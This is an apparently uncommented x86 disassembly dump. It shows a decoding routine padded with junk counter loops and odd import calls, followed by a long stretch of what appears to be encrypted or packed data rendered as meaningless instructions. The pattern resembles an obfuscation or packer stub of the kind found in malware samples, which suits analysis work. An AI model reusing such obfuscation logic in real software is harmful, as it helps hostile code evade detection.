  410298:	jae    0x4102ed
  41029e:	cmp    DWORD PTR ds:0x43372b,0xb
  4102a5:	jne    0x4102c6
  4102ab:	push   DWORD PTR [ebp-0x28]
  4102ae:	push   0x4636
  4102b3:	push   0x8d9e
  4102b8:	push   0x8baf
  4102bd:	push   DWORD PTR [ebp-0x18]
  4102c0:	call   DWORD PTR ds:0x412374
  4102c6:	cmp    DWORD PTR ds:0x43372b,0xa
  4102cd:	jne    0x4102e2
  4102d3:	xor    ecx,ecx
  4102d5:	add    ecx,DWORD PTR ds:0x43372b
  4102db:	inc    ecx
  4102dc:	mov    DWORD PTR ds:0x43372b,ecx
  4102e2:	jmp    0x410284
  4102e7:	sbb    ecx,DWORD PTR ds:0x433683
  4102ed:	lea    eax,[ebp-0x1]
  4102f0:	mov    DWORD PTR [ebp-0x10],eax
  4102f3:	mov    al,BYTE PTR [ebp-0x1]
  4102f6:	mov    ecx,DWORD PTR [ebp-0x10]
  4102f9:	sub    DWORD PTR ds:0x433767,0x43371f
  410303:	xor    al,0x46
  410305:	xor    DWORD PTR ds:0x433763,0x433717
  41030f:	sub    al,0x38
  410311:	mov    BYTE PTR [ecx],al
  410313:	movzx  ecx,WORD PTR ds:0x4336d7
  41031a:	sub    DWORD PTR ds:0x43369f,ecx
  410320:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  410327:	mov    DWORD PTR [ebp-0x10],0xf89c8532
  41032e:	and    DWORD PTR ds:0x4336db,0x0
  410338:	mov    ecx,DWORD PTR ds:0x4336db
  41033e:	inc    ecx
  41033f:	mov    DWORD PTR ds:0x4336db,ecx
  410345:	cmp    DWORD PTR ds:0x4336db,0x25
  41034c:	jne    0x410362
  410352:	push   0x43382f
  410357:	push   0x43386f
  41035c:	call   DWORD PTR ds:0x4120f4
  410362:	cmp    DWORD PTR ds:0x4336db,0x16
  410369:	jb     0x410338
  41036f:	adc    DWORD PTR ds:0x43371f,edx
  410375:	mov    eax,DWORD PTR [ebp-0x8]
  410378:	and    DWORD PTR ds:0x433793,0x0
  410382:	mov    ecx,DWORD PTR ds:0x433793
  410388:	inc    ecx
  410389:	mov    DWORD PTR ds:0x433793,ecx
  41038f:	cmp    DWORD PTR ds:0x433793,0xf
  410396:	jne    0x4103ac
  41039c:	push   0x433767
  4103a1:	push   0x178b
  4103a6:	call   DWORD PTR ds:0x412378
  4103ac:	cmp    DWORD PTR ds:0x433793,0xe
  4103b3:	jne    0x4103c8
  4103b9:	xor    ecx,ecx
  4103bb:	xor    ecx,DWORD PTR ds:0x433793
  4103c1:	inc    ecx
  4103c2:	mov    DWORD PTR ds:0x433793,ecx
  4103c8:	cmp    DWORD PTR ds:0x433793,0x1b
  4103cf:	jb     0x410382
  4103d5:	sub    DWORD PTR ds:0x4336df,edx
  4103db:	mov    ecx,0x7510854
  4103e0:	push   esi
  4103e1:	and    DWORD PTR ds:0x4336d7,0x0
  4103eb:	jmp    0x4103ff
  4103f0:	xor    esi,esi
  4103f2:	add    esi,DWORD PTR ds:0x4336d7
  4103f8:	inc    esi
  4103f9:	mov    DWORD PTR ds:0x4336d7,esi
  4103ff:	cmp    DWORD PTR ds:0x4336d7,0x1d
  410406:	jae    0x410427
  41040c:	cmp    DWORD PTR ds:0x4336d7,0x26
  410413:	jne    0x410422
  410419:	push   DWORD PTR [ebp-0x24]
  41041c:	call   DWORD PTR ds:0x4122b4
  410422:	jmp    0x4103f0
  410427:	xor    eax,ecx
  410429:	mov    esi,0x32729b
  41042e:	add    eax,esi
  410430:	jmp    0x41043d
  410435:	mov    dl,BYTE PTR [ebp-0x1]
  410438:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  41043c:	inc    eax
  41043d:	cmp    eax,0x40
  410440:	jb     0x410435
  410446:	mov    edx,DWORD PTR [ebp-0x8]
  410449:	mov    eax,DWORD PTR [ebp-0xc]
  41044c:	xor    edx,ecx
  41044e:	add    edx,esi
  410450:	cmp    edx,eax
  410452:	je     0x410766
  410458:	push   ebx
  410459:	push   edi
  41045a:	mov    edi,DWORD PTR [ebp+0x8]
  41045d:	mov    eax,0x8a3c
  410462:	xor    ax,WORD PTR [edi+edx*4+0x2]
  410467:	mov    edi,0x3b02
  41046c:	add    ax,di
  41046f:	movzx  eax,ax
  410472:	mov    DWORD PTR [ebp-0x14],eax
  410475:	mov    eax,DWORD PTR [ebp+0x8]
  410478:	movzx  eax,WORD PTR [eax+edx*4]
  41047c:	xor    eax,0x8a3c
  410481:	add    eax,edi
  410483:	mov    edi,DWORD PTR [ebp-0x14]
  410486:	mov    BYTE PTR [ebp+edi*1-0x58],al
  41048a:	jmp    0x410758
  41048f:	cdq    
  410490:	outs   dx,BYTE PTR ds:[esi]
  410491:	mov    ds:0xa1f17118,eax
  410496:	outs   dx,DWORD PTR ds:[esi]
  410497:	or     BYTE PTR [edx],bl
  410499:	push   es
  41049a:	out    0x26,al
  41049c:	or     DWORD PTR [ecx],ebp
  41049e:	fdiv   QWORD PTR cs:[eax+0x7caf7e7e]
  4104a5:	jle    0x410525
  4104a7:	cmc    
  4104a8:	jmp    0x3396cd1f
  4104ad:	jmp    0xca037e27
  4104b2:	jmp    0x5d112feb
  4104b7:	adc    edx,DWORD PTR [esi+0x529d25b3]
  4104bd:	ins    BYTE PTR es:[edi],dx
  4104be:	push   esi
  4104bf:	sub    al,0x0
  4104c1:	addr16 mov eax,0xbef9617e
  4104c7:	cmp    al,0x33
  4104c9:	dec    edx
  4104ca:	int3   
  4104cb:	sbb    ebx,ebp
  4104cd:	add    BYTE PTR [edx+0x18],ch
  4104d0:	jns    0x41046e
  4104d2:	clc    
  4104d3:	ror    DWORD PTR [edi],1
  4104d5:	cmp    edx,esi
  4104d7:	loop   0x4104aa
  4104d9:	mov    ebp,0xf7b14a80
  4104de:	adc    eax,0x93b72ca0
  4104e3:	sti    
  4104e4:	cmp    al,0x7b
  4104e6:	jg     0x41047d
  4104e8:	shl    BYTE PTR [edi],cl
  4104ea:	mov    es,esi
  4104ec:	call   0xd301:0x57ffad32
  4104f3:	pop    ecx
  4104f4:	out    dx,al
  4104f5:	adc    bh,BYTE PTR ds:0xaf1008f9
  4104fb:	jnp    0x41049c
  4104fd:	add    ebp,ebp
  4104ff:	lea    ecx,[ebx-0x4b]
  410502:	arpl   cx,cx
  410504:	jl     0x410486
  410506:	rcr    bl,0xe2
  410509:	mov    ds:0xdce670d9,eax
  41050e:	push   ds
  41050f:	shl    DWORD PTR [ebx],0x70
  410512:	aaa    
  410513:	fdivr  DWORD PTR [edi-0x31]
  410516:	xor    DWORD PTR [ebx],0x6266a102
  41051c:	test   DWORD PTR [edi],ecx
  41051e:	iret   
  41051f:	cmp    al,0x49
  410521:	mov    cl,0x77
  410523:	repz cmp eax,0x17460a02
  410529:	stc    
  41052a:	shl    DWORD PTR ds:0xac43ead4,cl
  410530:	mov    esp,0x56fc2ce2
  410535:	imul   esp,DWORD PTR [edi+0x69],0xffffffea
  410539:	sub    ah,BYTE PTR [esi-0x44]
  41053c:	xor    al,0xa0
  41053e:	sbb    al,0x71
  410540:	push   esi
  410541:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410542:	mov    ebx,0x8dd73988
  410547:	push   es
  410548:	pop    es
  410549:	xchg   esp,eax
  41054a:	sbb    dh,al
  41054c:	push   ecx
  41054d:	pop    edx
  41054e:	adc    bl,BYTE PTR [eax+0x21018415]
  410554:	hlt    
  410555:	xor    BYTE PTR [eax],bl
  410557:	ins    DWORD PTR es:[edi],dx
  410558:	jno    0x410537
  41055a:	xchg   ebp,eax
  41055b:	inc    esp
  41055c:	pop    esi
  41055d:	popa   
  41055e:	fwait
  41055f:	leave  
  410560:	js     0x4104ff
  410562:	adc    BYTE PTR ds:0xdd5367ed,al
  410568:	sub    al,0x1d
  41056a:	ds adc esi,ecx
  41056d:	or     BYTE PTR cs:[edi+0x34],bl
  410571:	mov    WORD PTR [ebp+ecx*8+0x29],ds
  410575:	lahf   
  410576:	ins    DWORD PTR es:[edi],dx
  410577:	jae    0x41053f
  410579:	popf   
  41057a:	adc    ecx,DWORD PTR [ecx-0x40d48d5]
  410580:	sub    esi,DWORD PTR [edx-0x2e8a0485]
  410586:	aas    
  410587:	lds    eax,FWORD PTR [esi+0x24]
  41058a:	stos   DWORD PTR es:[edi],eax
  41058b:	loop   0x41051d
  41058d:	popa   
  41058e:	in     eax,dx
  41058f:	add    ah,al
  410591:	mov    ?,WORD PTR [ebx]
  410593:	arpl   WORD PTR [ecx-0x7f880d1b],ax
  410599:	or     eax,0x94eba38b
  41059e:	out    dx,al
  41059f:	mov    ch,BYTE PTR [ebx+0x75]
  4105a2:	and    al,0xdc
  4105a4:	cmp    ebx,edi
  4105a6:	inc    esi
  4105a7:	fldcw  WORD PTR [esi+ebx*1]
  4105aa:	xor    BYTE PTR [ebp+ebp*4+0x7da2a6e7],dh
  4105b1:	or     dl,BYTE PTR [ecx+0x590fe225]
  4105b7:	inc    ecx
  4105b8:	fstp   QWORD PTR ds:0xa2f7e3f4
  4105be:	in     al,dx
  4105bf:	jno    0x41059d
  4105c1:	test   al,0x14
  4105c3:	add    bh,BYTE PTR [esi]
  4105c5:	adc    BYTE PTR [ebx+0x56],dh
  4105c8:	xlat   BYTE PTR ds:[ebx]
  4105c9:	in     al,dx
  4105ca:	add    BYTE PTR [ecx+0x269078d1],dh
  4105d0:	push   ss
  4105d1:	ficomp DWORD PTR [ecx]
  4105d3:	jae    0x4105f4
  4105d5:	dec    edx
  4105d6:	push   es
  4105d7:	(bad)  
  4105d8:	jle    0x4105b2
  4105da:	out    0x26,al
  4105dc:	xor    edx,DWORD PTR [ecx+0x25]
  4105df:	inc    edi
  4105e0:	loopne 0x4105d6
  4105e2:	scas   eax,DWORD PTR es:[edi]
  4105e3:	add    BYTE PTR [ecx],bh
  4105e5:	rol    BYTE PTR [ebx+esi*1-0x57],0x55
  4105ea:	test   eax,0xbeab6ce
  4105ef:	rcr    BYTE PTR [ebx],cl
  4105f1:	fidivr WORD PTR [esi]
  4105f3:	ja     0x41058b
  4105f5:	jl     0x4105a7
  4105f7:	fwait
  4105f8:	jns    0x410609
  4105fa:	stos   DWORD PTR es:[edi],eax
  4105fb:	call   0x6ec9:0x4629089a
  410602:	retf   
  410603:	mov    cl,0x51
  410605:	dec    BYTE PTR [ebx]
  410607:	imul   esp,DWORD PTR [ecx+0x7e848801],0xcf3aa791
  410611:	in     al,dx
  410612:	xor    esi,esp
  410614:	out    dx,eax
  410615:	xchg   ebp,eax
  410616:	ret    
  410617:	push   ebp
  410618:	push   cs
  410619:	fs jecxz 0x41069a
  41061c:	pushf  
  41061d:	dec    esi
  41061e:	lods   eax,DWORD PTR ds:[esi]
  41061f:	push   0x71b0a666
  410624:	nop
  410625:	sub    eax,0xa470ca64
  41062a:	enter  0xb0aa,0x22
  41062e:	call   0x9dde:0x9f1ec1ca
  410635:	fmul   DWORD PTR [eax-0x4e]
  410638:	repnz (bad) 
  41063a:	jle    0x410614
  41063c:	push   eax
  41063d:	mov    eax,ds:0x6ca0eaab
  410642:	jp     0x4105ca
  410644:	xchg   ebp,eax
  410645:	mov    ds:0xf7febfcb,eax
  41064a:	ja     0x41062a
  41064c:	dec    esp
  41064d:	mov    esi,0x70e140f4
  410652:	(bad)  
  410653:	out    0x29,al
  410655:	shl    DWORD PTR [esi],1
  410657:	loop   0x4106ca
  410659:	loop   0x410614
  41065b:	out    dx,eax
  41065c:	mov    esi,0xf758fa42
  410661:	xchg   ecx,eax
  410662:	xchg   BYTE PTR [ebx-0x6977c012],ah
  410668:	(bad)  
  410669:	shl    BYTE PTR [esi-0x36880877],1
  41066f:	inc    eax
  410670:	fisub  DWORD PTR [edx+0x643a4cde]
  410676:	jmp    0x4106aa
  410678:	rcr    BYTE PTR [ecx-0x1f23559e],cl
  41067e:	sbb    BYTE PTR [esi-0x5c],dl
  410681:	les    ebx,FWORD PTR [eax+0x6c17fe85]
  410687:	xchg   edx,eax
  410688:	pushf  
  410689:	add    edi,DWORD PTR [esi+esi*4+0x38]
  41068d:	adc    DWORD PTR [ebx-0x6c],esi
  410690:	fistp  DWORD PTR [eax+0x5465d5b9]
  410696:	rcl    DWORD PTR es:[edi-0x55e0b631],cl
  41069d:	ins    DWORD PTR es:[edi],dx
  41069e:	lahf   
  41069f:	add    eax,0x404cec67
  4106a4:	xchg   edi,eax
  4106a5:	(bad)  
  4106a6:	xchg   edi,eax
  4106a7:	xchg   ebp,eax
  4106a8:	mov    ebp,0xd5b800c1
  4106ad:	aam    0x45
  4106af:	jno    0x4106da
  4106b1:	push   0xffffffb2
  4106b3:	sbb    al,0x5b
  4106b5:	sbb    DWORD PTR [ecx],ebp
  4106b7:	push   cs
  4106b8:	lods   eax,DWORD PTR ds:[esi]
  4106b9:	into   
  4106ba:	xchg   BYTE PTR [ebp-0x2a84d2fa],al
  4106c0:	pop    ds
  4106c1:	xchg   esp,eax
  4106c2:	xchg   DWORD PTR [ecx],ebp
  4106c4:	add    eax,0x8f1bd13a
  4106c9:	xchg   BYTE PTR [eax+0x74],al
  4106cc:	scas   al,BYTE PTR es:[edi]
  4106cd:	mov    bl,0xd1
  4106cf:	xor    eax,0xb6b42a00
  4106d4:	or     eax,0xd6778b0
  4106d9:	mov    bl,ah
  4106db:	neg    DWORD PTR [ebp-0x5cc1e4cb]
  4106e1:	adc    dh,bh
  4106e3:	jne    0x410693
  4106e5:	call   0x60de9aac
  4106ea:	nop
  4106eb:	jnp    0x4106a0
  4106ed:	adc    DWORD PTR [edx+0x79747020],ecx
  4106f3:	mov    cs,WORD PTR [ebp+0x4d]
  4106f6:	pop    eax
  4106f7:	leave  
  4106f8:	scas   eax,DWORD PTR es:[edi]
  4106f9:	mov    esp,DWORD PTR [ecx+0x3cd9e9aa]
  4106ff:	nop
  410700:	xchg   ebp,esp
  410702:	test   al,0x57
  410704:	push   eax
  410705:	dec    esp
  410706:	jge    0x4106ca
  410708:	out    0x30,al
  41070a:	push   0x44803690
  41070f:	addr16 push edi
  410711:	mov    eax,ds:0x8333d58f
  410716:	or     al,BYTE PTR [edx]
  410718:	or     BYTE PTR [ebx+0x650e7879],ch
  41071e:	mov    edi,0xb42e1dff
  410723:	pop    ebp
  410724:	pop    ebx
  410725:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410726:	xor    eax,0x7455aff0
  41072b:	lds    edx,FWORD PTR ds:[ebx+0x20]
  41072f:	fwait
  410730:	push   ebx
  410731:	pop    esp
  410732:	out    0xc3,al
  410734:	ins    DWORD PTR es:[edi],dx
  410735:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410736:	sbb    DWORD PTR [esi],ebp
  410738:	dec    eax
  410739:	push   ecx
  41073a:	inc    edi
  41073b:	mov    esi,0x28b06b7d
  410740:	sti    
  410741:	xchg   ebp,eax
  410742:	bound  ebx,QWORD PTR [esp+eiz*8-0x25]
  410746:	pop    ecx
  410747:	lea    edx,[esi]
  410749:	imul   edx,ebp,0x7
  41074c:	scas   al,BYTE PTR es:[edi]
  41074d:	dec    eax
  41074e:	cdq    
  41074f:	dec    edx
  410750:	dec    ebx
  410751:	nop
  410752:	addr16 pop eax
  410754:	jb     0x41071f
  410756:	(bad)  
  410757:	push   ebx
  410758:	mov    eax,DWORD PTR [ebp-0xc]
  41075b:	inc    edx
  41075c:	cmp    edx,eax
  41075e:	jne    0x41045a
  410764:	pop    edi
  410765:	pop    ebx
  410766:	mov    eax,DWORD PTR [ebp-0x8]
  410769:	mov    edx,DWORD PTR [ebp+0x10]
  41076c:	xor    eax,ecx
  41076e:	jmp    0x410a3c
  410773:	mov    ds:0x6929ab51,eax
  410778:	icebp  
  410779:	mov    eax,ds:0x2251d751
  41077e:	and    eax,0x2e78b43c
  410783:	or     eax,0xaf7e7ebf
  410788:	jl     0x410808
  41078a:	jle    0x41076c
  41078c:	inc    ecx
  41078d:	fs out dx,eax
  41078f:	test   al,ch
  410791:	in     eax,0xf3
  410793:	rol    DWORD PTR [ecx-0x30],1
  410796:	mov    BYTE PTR [esi+0x467204e7],cl
  41079c:	adc    ebp,DWORD PTR [eax-0x4dcb519f]
  4107a2:	jmp    0x3e05f84b
  4107a7:	sbb    al,0xb8
  4107a9:	and    DWORD PTR [ebp-0x22efaa42],ebx
  4107af:	inc    eax
  4107b0:	mov    dh,0x66
  4107b2:	in     al,0xe4
  4107b4:	mov    eax,0x3ae0376b
  4107b9:	xchg   ebx,eax
  4107ba:	pusha  
  4107bb:	mov    ah,0x7a
  4107bd:	xchg   edi,eax
  4107be:	popa   
  4107bf:	jmp    0xd11d:0x3de79a91
  4107c6:	ins    BYTE PTR es:[edi],dx
  4107c7:	retf   
  4107c8:	cmp    al,al
  4107ca:	gs fwait
  4107cc:	jbe    0x41080e
  4107ce:	mov    ecx,0x594eb72a
  4107d3:	jbe    0x4107dd
  4107d5:	pop    edx
  4107d6:	cmp    DWORD PTR [ebp+0x5514ba43],edi
  4107dc:	mov    edx,0xa277aac7
  4107e1:	scas   eax,DWORD PTR es:[edi]
  4107e2:	test   eax,0x1edba01d
  4107e7:	aaa    
  4107e8:	mov    ebx,0x94868ac7
  4107ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4107ee:	shl    dh,cl
  4107f0:	push   0xffffffe8
  4107f2:	aad    0xa
  4107f4:	ret    0x2170
  4107f7:	inc    edi
  4107f8:	jle    0x4107f9
  4107fa:	jbe    0x4107d7
  4107fc:	add    eax,0xa8d41b
  410801:	fild   WORD PTR ds:0x9aec7d7a
  410807:	push   0x8154ed2c
  41080c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41080d:	pop    esp
  41080e:	ret    0x57ea
  410811:	(bad)  
  410812:	jnp    0x410882
  410814:	jp     0x410810
  410816:	sbb    ah,BYTE PTR [esi]
  410818:	xor    eax,0xe7ad5d92
  41081d:	cmp    edi,DWORD PTR [edi-0x37]
  410820:	mov    eax,ds:0x7ef3514e
  410825:	xchg   esi,eax
  410826:	push   ebx
  410827:	sub    al,0xd7
  410829:	mov    al,ds:0x3c065cde
  41082e:	xchg   esi,eax
  41082f:	cmp    al,0xc3
  410831:	push   esp
  410832:	dec    edi
  410833:	pop    ecx
  410834:	enter  0x9ce9,0xb1
  410838:	inc    eax
  410839:	mov    ds:0x673c14cf,eax
  41083e:	mov    edx,0x120638
  410843:	adc    cl,BYTE PTR [eax+0x4ce410b3]
  410849:	push   cs
  41084a:	push   edi
  41084b:	dec    ecx
  41084c:	(bad)  
  41084e:	gs aas 
  410850:	les    esi,FWORD PTR [esi]
  410852:	inc    esi
  410853:	(bad)  
  410854:	stos   DWORD PTR es:[edi],eax
  410855:	out    dx,eax
  410856:	pop    edi
  410857:	sub    BYTE PTR [edx-0x6ab901aa],ah
  41085d:	dec    edi
  41085e:	sub    DWORD PTR [ecx-0x5d],esp
  410861:	fadd   QWORD PTR [edi+0x7a]
  410864:	push   ds
  410865:	push   ebp
  410866:	or     al,0xf0
  410868:	and    al,0x18
  41086a:	sbb    DWORD PTR ds:0x31febdd5,edi
  410870:	sub    eax,0x3e06b6a7
  410875:	mov    bh,0x49
  410877:	mov    ebp,0xef286f50
  41087c:	sahf   
  41087d:	outs   dx,DWORD PTR ds:[esi]
  41087e:	mov    dh,BYTE PTR [edx]
  410880:	and    ecx,DWORD PTR [edi+0x54]
  410883:	int    0x25
  410885:	pop    ss
  410886:	mov    esp,0x73640209
  41088b:	sub    BYTE PTR [edx+0x614f7bc1],dl
  410891:	ret    
  410892:	or     BYTE PTR [esi-0x64],0x7c
  410896:	mov    cl,0x14
  410898:	or     ah,bl
  41089a:	push   cs
  41089b:	inc    ebp
  41089c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41089d:	gs push esp
  41089f:	ret    0x9d20
  4108a2:	hlt    
  4108a3:	inc    eax
  4108a4:	(bad)  
  4108a6:	pop    ebx
  4108a7:	or     DWORD PTR [edi-0x2d3c21fe],esi
  4108ad:	arpl   WORD PTR [esi+0x261013a6],di
  4108b3:	scas   al,BYTE PTR es:[edi]
  4108b4:	loopne 0x4108ea
  4108b6:	jne    0x4108d0
  4108b8:	rol    eax,0x2b
  4108bb:	ins    DWORD PTR es:[edi],dx
  4108bc:	arpl   WORD PTR [edx+0x33],di
  4108bf:	ds mov cl,0x66
  4108c2:	mov    ecx,0x8f30fd46
  4108c7:	or     dl,cl
  4108c9:	pusha  
  4108ca:	outs   dx,BYTE PTR ds:[esi]
  4108cb:	and    al,0x22
  4108cd:	das    
  4108ce:	mov    bh,0x59
  4108d0:	xchg   ebx,eax
  4108d1:	hlt    
  4108d2:	int3   
  4108d3:	adc    ecx,esp
  4108d5:	jne    0x410884
  4108d7:	dec    esp
  4108d8:	jle    0x410870
  4108da:	fmul   DWORD PTR [edx]
  4108dc:	stos   DWORD PTR es:[edi],eax
  4108dd:	xor    esi,DWORD PTR [ecx]
  4108df:	cmp    ebp,0xffffffc5
  4108e2:	sub    al,0xec
  4108e4:	jmp    0xae8a5a56
  4108e9:	add    eax,DWORD PTR [eax+0x6d2b4c74]
  4108ef:	and    BYTE PTR [edi-0x3],dl
  4108f2:	dec    ebx
  4108f3:	iret   
  4108f4:	mov    cl,0xf5
  4108f6:	daa    
  4108f7:	sbb    bl,BYTE PTR [ebx+0x38]
  4108fa:	stos   BYTE PTR es:[edi],al
  4108fb:	push   ebp
  4108fc:	outs   dx,BYTE PTR ds:[esi]
  4108fd:	nop
  4108fe:	push   ecx
  4108ff:	xlat   BYTE PTR ds:[ebx]
  410900:	rcr    eax,cl
  410902:	jle    0x41096d
  410904:	icebp  
  410905:	repz test BYTE PTR [ecx],bh
  410908:	scas   al,BYTE PTR es:[edi]
  410909:	mov    eax,ds:0x978c867a
  41090e:	popa   
  41090f:	sbb    DWORD PTR [edx+ebp*4+0x6324e50d],0x9550408c
  41091a:	and    DWORD PTR [eax+0x2380af69],0x3dc4aebb
  410924:	enter  0x6253,0xfb
  410928:	mov    al,ds:0xfd190859
  41092d:	cs xor eax,0xeec03581
  410933:	and    BYTE PTR [ebp+0x6b8c7fd6],cl
  410939:	in     al,0x83
  41093b:	dec    esp
  41093c:	sbb    al,0x68
  41093e:	dec    edi
  41093f:	fdivrp st(5),st
  410941:	imul   esp,DWORD PTR [ebx],0xffffffa1
  410944:	js     0x41090d
  410946:	shl    al,cl
  410948:	push   ebp
  410949:	add    DWORD PTR [ebx-0x3204f381],ecx
  41094f:	jnp    0x410978
  410951:	(bad)  
  410952:	sti    
  410953:	pop    esp
  410954:	out    dx,eax
  410955:	aam    0x61
  410957:	pop    es
  410958:	dec    esi
  410959:	jecxz  0x4109b0
  41095b:	push   edx
  41095c:	add    eax,0x5f1d39a8
  410961:	loope  0x410951
  410963:	loope  0x4109d7
  410965:	outs   dx,DWORD PTR ds:[esi]
  410966:	xchg   DWORD PTR [edi+ecx*8-0xc282da3],ebx
  41096d:	addr16 pop es
  41096f:	jne    0x410903
  410971:	inc    edx
  410972:	sub    ch,BYTE PTR [ebp-0x78fc4cab]
  410978:	aad    0xdc
  41097a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41097b:	pop    ecx
  41097c:	xchg   esp,eax
  41097d:	and    ebp,0x5230deea
  410983:	xchg   edx,eax
  410984:	xor    al,0xa2
  410986:	retf   0xc700
  410989:	into   
  41098a:	sbb    ecx,edx
  41098c:	xchg   esi,eax
  41098d:	and    dh,BYTE PTR [ecx+0x5f]
  410990:	cmc    
  410991:	mov    ah,0x9d
  410993:	sub    eax,0xf63c0859
  410998:	mov    al,ds:0x2a410bd6
  41099d:	ins    BYTE PTR es:[edi],dx
  41099e:	ins    BYTE PTR es:[edi],dx
  41099f:	jno    0x4109f9
  4109a1:	jno    0x410928
  4109a3:	jmp    0x3e60fb5
  4109a8:	jbe    0x41092e
  4109aa:	into   
  4109ab:	hlt    
  4109ac:	in     al,0xe
  4109ae:	jmp    0xecb473f
  4109b3:	pusha  
  4109b4:	sub    eax,edi
  4109b6:	popf   
  4109b7:	add    DWORD PTR [ebx+0x3f],0x3d
  4109bb:	xor    cl,BYTE PTR [esi-0x6d0c5776]
  4109c1:	in     eax,dx
  4109c2:	jne    0x4109ab
  4109c4:	and    al,bl
  4109c6:	repz jmp DWORD PTR [ebx+0xd]
  4109ca:	sbb    DWORD PTR [eax],ebp
  4109cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4109cd:	push   0x1efa6f8e
  4109d2:	in     eax,0x53
  4109d4:	sub    DWORD PTR [ebp+0x20015cd],esi
  4109da:	mov    cl,0x18
  4109dc:	into   
  4109dd:	push   0xffffffb0
  4109df:	inc    edx
  4109e0:	mov    al,0xd3
  4109e2:	aas    
  4109e3:	sbb    al,0xcf
  4109e5:	add    al,0xb7
  4109e7:	adc    al,0x16
  4109e9:	cli    
  4109ea:	arpl   WORD PTR [edx],bp
  4109ec:	xor    DWORD PTR [ebp-0x4d],esp
  4109ef:	cmp    BYTE PTR [ebp+0x6fd03bb9],ah
  4109f5:	jnp    0x4109a6
  4109f7:	xchg   edx,eax
  4109f8:	jecxz  0x41097e
  4109fa:	(bad)  
  4109fb:	setl   BYTE PTR [eax]
  4109fe:	js     0x410a76
  410a00:	jmp    0xbf42:0xf628baf5
  410a07:	inc    eax
  410a08:	mov    dl,BYTE PTR [edx+0x7e54b37f]
  410a0e:	in     al,dx
  410a0f:	dec    esi
  410a10:	mov    edx,0x4aa33902
  410a15:	loope  0x410a5e
  410a17:	xor    al,0xc1
  410a19:	pop    edi
  410a1a:	or     ah,cl
  410a1c:	adc    ah,dl
  410a1e:	ins    BYTE PTR es:[edi],dx
  410a1f:	call   0xe2be0b30
  410a24:	push   cs
  410a25:	sahf   
  410a26:	fsub   st(6),st
  410a28:	xor    al,0xef
  410a2a:	call   DWORD PTR [esi-0x209a1509]
  410a30:	ret    0xe084
  410a33:	and    BYTE PTR [esi+0xc],ah
  410a36:	adc    BYTE PTR [ebx+0x33],dl
  410a39:	mov    cl,0x9b
  410a3b:	rol    BYTE PTR [ebx],1
  410a3d:	(bad)  
  410a3e:	jmp    0x410d0c
  410a43:	add    dh,BYTE PTR [edx]
  410a45:	fdiv   QWORD PTR fs:[eax+ebp*2-0x7e]
  410a4a:	lock pop eax
  410a4c:	(bad)  
  410a4d:	xchg   esp,eax
  410a4e:	pop    esi
  410a4f:	pop    ebx
  410a50:	push   ss
  410a51:	sar    DWORD PTR [edx+edi*4],0xbd
  410a55:	jle    0x410ad5
  410a57:	scas   eax,DWORD PTR es:[edi]
  410a58:	jl     0x410ad8
  410a5a:	jle    0x410a1b
  410a5c:	add    al,0x28
  410a5e:	push   cs
  410a5f:	aam    0xbf
  410a61:	sbb    ebp,edx
  410a63:	addr16 push ds
  410a65:	xor    al,0x7e
  410a67:	push   edi
  410a68:	std    
  410a69:	mov    edi,0x9a09491e
  410a6e:	scas   eax,DWORD PTR es:[edi]
  410a6f:	and    eax,0x3a4eac73
  410a74:	mov    dl,0x5f
  410a76:	mov    bh,ch
  410a78:	out    0x4c,al
  410a7a:	xor    edi,DWORD PTR [ebp+0x45]
  410a7d:	fadd   st,st(2)
  410a7f:	stos   BYTE PTR es:[edi],al
  410a80:	repnz pop es
  410a82:	pop    eax
  410a83:	fwait
  410a84:	lds    edi,FWORD PTR [ebx-0x3368a366]
  410a8a:	jno    0x410a26
  410a8c:	push   ecx
  410a8d:	mov    esp,0x2bf0572c
  410a92:	jmp    FWORD PTR ds:0xccc52378
  410a98:	xchg   ebp,eax
  410a99:	gs test al,0x65
  410a9c:	test   al,0x4
  410a9e:	sub    al,0x84
  410aa0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410aa1:	xchg   edi,eax
  410aa2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410aa3:	out    0x36,eax
  410aa5:	leave  
  410aa6:	mov    BYTE PTR [eax-0x28],al
  410aa9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410aaa:	les    ebp,FWORD PTR [edi+0x74]
  410aad:	test   edi,esp
  410aaf:	not    DWORD PTR [edx+0x23f9391c]
  410ab5:	pop    ss
  410ab6:	mov    dl,0x7a
  410ab8:	jle    0x410aae
  410aba:	test   eax,0xdf23c144
  410abf:	push   ecx
  410ac0:	imul   BYTE PTR [edx-0x6c]
  410ac3:	nop
  410ac4:	add    DWORD PTR ds:0x8ba4f34d,ebx
  410aca:	rcl    DWORD PTR [esi-0x4ae4be89],0xf3
  410ad1:	or     eax,0x7b159800
  410ad6:	jns    0x410b0d
  410ad8:	dec    esp
  410ad9:	jnp    0x410add
  410adb:	enter  0x6640,0x2d
  410adf:	les    eax,FWORD PTR [edx+esi*1-0x671f3ae1]
  410ae6:	adc    BYTE PTR [ecx],bh
  410ae8:	nop
  410ae9:	xchg   ebp,eax
  410aea:	sbb    ebp,ebp
  410aec:	das    
  410aed:	dec    ecx
  410aee:	retf   
  410aef:	dec    ecx
  410af0:	pop    ecx
  410af1:	push   eax
  410af2:	pop    ss
  410af3:	sub    al,0x60
  410af5:	mov    ah,0xcd
  410af7:	mov    dl,0x96
  410af9:	(bad)  
  410afa:	out    0xb0,al
  410afc:	adc    DWORD PTR ds:0xab84b2d8,edi
  410b02:	out    0xdc,al
  410b04:	ficomp WORD PTR [esi+edi*1-0x54]
  410b08:	or     edi,ebp
  410b0a:	pusha  
  410b0b:	(bad)  [ebx+ebx*4+0x4b37fe66]
  410b12:	xor    eax,0xc8079b67
  410b17:	push   ss
  410b18:	xchg   ecx,eax
  410b19:	push   0xffffffbc
  410b1b:	pushf  
  410b1c:	les    edi,FWORD PTR [eax-0x3f]
